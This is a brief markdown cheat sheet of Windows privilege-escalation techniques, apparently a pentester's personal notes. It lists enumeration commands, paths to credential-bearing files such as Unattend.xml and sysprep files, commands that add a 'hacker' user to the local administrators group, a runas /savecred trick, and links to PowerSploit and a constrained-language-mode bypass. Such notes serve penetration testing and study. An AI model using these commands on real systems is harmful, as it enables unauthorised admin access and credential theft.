# Windows priv esc

## LINKS

* https://www.fuzzysecurity.com/tutorials/16.html
* https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html CHECK THIS
* https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
* https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/
* https://support.microsoft.com/en-us/help/251192/how-to-create-a-windows-service-by-using-sc-exe


## Who are you, are you system ?
echo %username%
net user <user>

## what users on the system?
net users
net localgroup

## What is the windows version?
EULA.txt, sysinfo

## sensitive files ?
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

## Group policies ?
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Group

## regedit interesting things

- InstallAsAdmin
...

## WMIC for info
see https://www.fuzzysecurity.com/tutorials/16.html
https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar

## Can you add an admin user?
net users hacker pass /add
net localgroup administrators hacker /add

## what on users homes?
any useful info?

## Firewall
netsh firewall show state
netsh firewall show config

## can we runas ?
https://ss64.com/nt/runas.html
This was working on a machine : 

```
runas /user:administrator /savecred "c:\users\security\downloads\wsrt.exe"
```

## what are sheduled tasks?
schtasks /query /fo LIST /v

## Can we remplace a service?
Uee accesschk to search writables services
accesschk.exe -uwcqv "testuser" * 

## What services are accessible from inside?
netstat -aon

## Is there any useful tool?
python, perl, ...

## What programs are installeds?
dir c:\program files
dir c:\program files (x86)

search for local exploits on this programs

## vault
policy.vpol ? see powersploit

## unattended
https://www.dionach.com/blog/logmein-rescue-unattended-service-privilege-escalation


## powershell

- powersploit has some great tools https://github.com/PowerShellMafia/PowerSploit
- to bypass CLM : https://github.com/padovah4ck/PSByPassCLM

